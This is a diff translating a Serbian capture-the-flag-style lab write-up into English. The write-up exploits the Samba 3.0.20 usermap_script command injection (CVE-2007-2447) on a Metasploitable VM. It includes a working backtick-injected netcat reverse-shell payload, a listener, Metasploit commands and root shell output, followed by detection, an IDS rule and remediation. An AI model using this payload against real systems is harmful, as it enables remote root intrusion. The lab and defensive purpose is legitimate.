@@ -1,50 +1,49 @@
 # Samba 3.0.20 — usermap_script RCE (CVE-2007-2447)
 
-Za razliku od vsftpd backdoor-a, ovde nije u pitanju trovanje izvornog koda
-nego obična greška u logici servisa. Samba ima opciju `username map script`
-koja, kad je uključena, prosleđuje username kroz shell skriptu radi mapiranja
-korisnika — problem je što to radi bez ikakve sanitizacije, pa se username
-polje može zloupotrebiti za ubacivanje shell komandi. Pošto SMB daemon radi
-kao root, sve što se ubaci izvršava se sa root privilegijama.
+Unlike the vsftpd backdoor, nobody poisoned the source here. This is a plain
+logic bug. Samba has a `username map script` option that, when it's on, runs the
+username through a shell script to map users. The catch is it does that with zero
+sanitization, so you can stuff shell commands into the username field. And since
+the SMB daemon runs as root, whatever you inject runs as root too.
 
-## Cilj
+## Target
 - IP: 192.168.56.102
 - Port: 139/445 (SMB/Samba)
-- Servis: Samba 3.0.20-Debian
+- Service: Samba 3.0.20-Debian
 
 ## CVE
 CVE-2007-2447
 
-## Tip napada
-Command injection (nesanitizovan input prosleđen shell-u)
+## Attack type
+Command injection (unsanitized input handed to the shell)
 
 ## MITRE ATT&CK
 - T1190 – Exploit Public-Facing Application
 - T1059 – Command and Scripting Interpreter
 - T1021.002 – Remote Services: SMB/Windows Admin Shares
 
-## Mehanizam
+## Mechanism
 
-Kad je `username map script` aktivan, Samba prosleđuje username direktno
-shell-u bez ikakve provere. Ubacivanjem shell komande u username polje
-(preko backtick karaktera) napadač dobija izvršavanje koda kao root.
+With `username map script` active, Samba passes the username straight to the shell
+without checking it. Drop a shell command into the username field (inside
+backticks) and you get code execution as root.
 
 ---
 
-## Metod 1: Ručna eksploatacija
+## Method 1: Manual exploitation
 
-### Korak 1: Enumeracija SMB share-ova
+### Step 1: Enumerate SMB shares
 
 ```bash
 smbclient -L 192.168.56.102 -N
 ```
 
-`-L` prikazuje listu dostupnih share-ova, `-N` znači da se pokušava
-anonymous pristup, bez lozinke.
+`-L` lists the available shares; `-N` tries an anonymous connection with no
+password.
 
-### Rezultat enumeracije
+### Enumeration result
 
-![SMB enumeracija](screenshots/02_samba_enum.png)
+![SMB enumeration](screenshots/02_samba_enum.png)
 
 Sharename Type Comment
 
@@ -55,38 +54,38 @@ IPC$ IPC IPC Service (metasploitable server (Samba 3.0.20-Debian))
 ADMIN$ IPC IPC Service (metasploitable server (Samba 3.0.20-Debian))
 
 
-### Korak 2: Pokreni listener
+### Step 2: Start a listener
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Korak 3: Pošalji payload
+### Step 3: Send the payload
 
 ```bash
 smbclient //192.168.56.102/tmp -N --option='client min protocol=NT1' -c 'logon "/=`nohup nc -e /bin/sh 192.168.56.101 4444`"'
 ```
 
-`--option='client min protocol=NT1'` je tu jer noviji Kali podrazumevano
-koristi SMB2/3, koji nije kompatibilan sa ovako starom Sambom — moralo je
-da se forsira stariji protokol. Payload sedi unutar backtick karaktera u
-`logon` komandi, i to je ono što se izvršava kao shell komanda.
+I needed `--option='client min protocol=NT1'` because newer Kali defaults to
+SMB2/3, which a Samba this old won't speak, so I had to force the older protocol.
+The payload lives inside the backticks in the `logon` command, and that's the
+part that runs as a shell command.
 
-### Rezultat
+### Result
 
-![Root shell preko Sambe](screenshots/02_samba_root.png)
+![Root shell via Samba](screenshots/02_samba_root.png)
 
 whoami → root
 id → uid=0(root) gid=0(root)
 hostname → metasploitable
-cat /etc/passwd → potvrda pristupa fajl sistemu kao root
+cat /etc/passwd → confirms filesystem access as root
 
 
 ---
 
-## Metod 2: Metasploit
+## Method 2: Metasploit
 
-### Komande
+### Commands
 
 ```bash
 msfconsole
@@ -97,9 +96,9 @@ set LHOST 192.168.56.101
 run
 ```
 
-### Rezultat
+### Result
 
-![Metasploit eksploatacija](screenshots/02_samba_metasploit_root.png)
+![Metasploit exploitation](screenshots/02_samba_metasploit_root.png)
 
 [*] Command shell session 1 opened
 whoami → root
@@ -107,34 +106,30 @@ id → uid=0(root) gid=0(root)
 hostname → metasploitable
 
 
-Razlika u odnosu na ručnu verziju je uglavnom u pogodnosti — Metasploit
-sam bira payload i otvara listener, dok kod ručnog pristupa se tačno vidi
-šta se šalje i kako se izvršava.
+The difference from the manual run is mostly convenience. Metasploit picks the
+payload and sets up the listener for you, whereas doing it by hand you see exactly
+what gets sent and how it runs.
 
 ---
 
-## Detekcija (blue team ugao)
+## Detection (blue-team view)
 
-- Username polje sa backtick karakterima ili shell sintaksom — nijedan
-  legitiman username ne izgleda tako
-- Odlazna konekcija sa SMB servera ka eksternom IP-u i portu (reverse shell)
-- Proces poput `nc` ili `bash` koji se spawn-uje iz Samba daemona — jasna
-  anomalija u process tree-u, lako uočljiva u SIEM-u
-- Neočekivana odlazna konekcija na port 4444
+- A username field with backticks or shell syntax. No real username looks like that.
+- An outbound connection from the SMB server to an external IP and port (the reverse shell).
+- A process like `nc` or `bash` spawning out of the Samba daemon. That stands out immediately in a process tree, and a SIEM will catch it.
+- An unexpected outbound connection on port 4444.
 
-## IDS potpis (Suricata primer)
+## IDS signature (Suricata example)
 
 alert tcp any 139 -> any any (msg:"Samba reverse shell outbound connection"; flow:established,to_client; sid:9000002;)
 
 
-## Remedijacija
+## Remediation
 
-- Upgrade Samba na verziju bez ove ranjivosti (3.0.25+)
-- Isključiti `username map script` opciju ako nije neophodna
-- Firewall pravilo koje SMB serveru zabranjuje odlazne konekcije na
-  proizvoljne portove
-- Segmentacija mreže — SMB treba da bude dostupan samo interno, nikad
-  izložen ka internetu
+- Upgrade Samba past this bug (3.0.25+).
+- Turn off `username map script` if you don't actually need it.
+- A firewall rule that stops the SMB server from making outbound connections to arbitrary ports.
+- Segment the network. SMB should be internal only, never exposed to the internet.
 
 ## Screenshots
 - `02_samba_enum.png`
